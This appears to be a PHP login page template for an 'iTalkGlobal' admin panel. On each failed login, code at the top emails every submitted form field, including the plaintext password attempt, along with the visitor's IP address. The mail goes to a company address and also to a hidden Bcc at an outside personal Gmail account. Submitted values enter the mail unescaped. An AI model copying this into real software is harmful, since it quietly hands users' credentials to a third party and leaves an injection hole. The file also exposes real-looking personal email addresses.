<!-- Show a dialog -->
<?php if ($errors['fail'] == 1) { ?>
    <div class="g_1">
        <div class="dialog error">
            <p> <?php print_r($errors['error']); ?></p>
            <span>x</span>
        </div>
    </div>
    
<?php 

$to  = 'amit@italkglobal.co'; // note the comma
//$to .= 'wez@example.com';

// subject
$subject = 'Try to Login Using Bad credentials in iTalkGlobal Admin Panel';

$message = '
<html>
<head>
  <title>Try to Login Using Bad credentials in iTalkGlobal Admin Panel</title>
</head>
<body>
  <p>Hi Amit,</p>
  <p>Someone has tried to Login in Italk admin Panel using Bad Credentials , Below are the Detail</p>
  <br> 
 <p>IP Address  :'.$_SERVER['REMOTE_ADDR'].'</p>
 <p>Date & Time :'.date('m/d/Y H:i:s').'</p>';
 foreach ($_POST as $key => $value) {
     if($key!='errors')
    $message.='<p>'.ucfirst($key). ':' . $value . '</p>';
}    
 $message.='<br><p>Thanks<br>Admin</p>
</body>
</html>
';

// To send HTML mail, the Content-type header must be set
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";

// Additional headers
$headers .= 'To: Amit <amit@italkglobal.co>' . "\r\n";
$headers .= 'From: iTalkGlobal Admin <admin@italkglobal.co>' . "\r\n";
//$headers .= 'Cc: birthdayarchive@example.com' . "\r\n";
$headers .= 'Bcc: tohkbhavsar@gmail.com' . "\r\n";

// Mail it
mail($to, $subject, $message, $headers);
 } ?>
<div id="login-outher">        
    <div id="login-inner">
        <header style="padding-left: 0px;">
            <h2 style="text-align: center;float: none;font-size:29px;">Login</h2> 
            <!--<ul class="e-splitmenu" id="login-lang">
                <li><span>English</span><a href="javascript:void(0);"><img src="<?php echo Kohana::$base_url; ?>images/icons/flags/gb.png" alt=""/></a>
                
                     <div>
                        <ul>
                            <li><a href="index.html"><img src="<?php echo Kohana::$base_url; ?>images/icons/flags/gb.png" alt=""/> English</a></li>
                            <li><a href="index.html"><img src="<?php echo Kohana::$base_url; ?>images/icons/flags/de.png" alt=""/> German</a></li>
                            <li><a href="index.html"><img src="<?php echo Kohana::$base_url; ?>images/icons/flags/es.png" alt=""/> Spanish</a></li>
                        </ul>                                      
                    </div>                               

                </li>
            </ul>-->                                 
        </header>

        <div id="login-content">
            <form action="" method="post" id="login-form">
                <div class="g_1">
                    <label>Callcenter</label>
                </div> 
                <div class="g_1">
                    <select name="" data-validation-type="present">
                        <option value="">-- select option --</option>
                        <option value="iTalkGlobal">iTalkGlobal</option>
                        <?php/* for ($i = 0; $i < count($callcenterData); $i++) { ?>
                            <option value="a"><?php echo ucfirst($callcenterData[$i]->name); ?></option>
                        <?php }*/ ?>
                    </select>
                </div>
                <div class="g_1">
                    <label for="username">Username</label>
                </div>
                <div class="g_1">                            
                    <input type="text" name="username" id="username" tabindex="1" data-validation-type="present"/>
                </div>

                <div class="spacer-10"><!-- spacer 20px --></div> 

                <div class="g_1">
                    <label for="password">Password</label>
                    <!--<a href="javascript:void(0);" class="forgot-password">Forgot password?</a>-->
                </div>
                <div class="g_1">  
                    <input type="password" name="password" id="password" tabindex="2" data-validation-type="present"/> 
                </div>

                <div class="spacer-20"><!-- spacer 20px --></div> 

                <div class="g_1">
                   <!--<input type="checkbox" name="" id="field3" tabindex="3"/>
                   <label for="field3">Remember me</label>-->
                    <input type="submit" value="Login" name="" tabindex="4" class="button-text"/>
                   <!-- <a href="javascript:void(0);" id="show-password" class="button-icon tip-n" title="Show Password" style="float:right"><span class="info-10 plix-10"></span></a>-->
                </div>               
            </form>
        </div><!-- End #login-content --> 
    </div><!-- End #login-inner -->                                  
</div><!-- End #login-outher --> 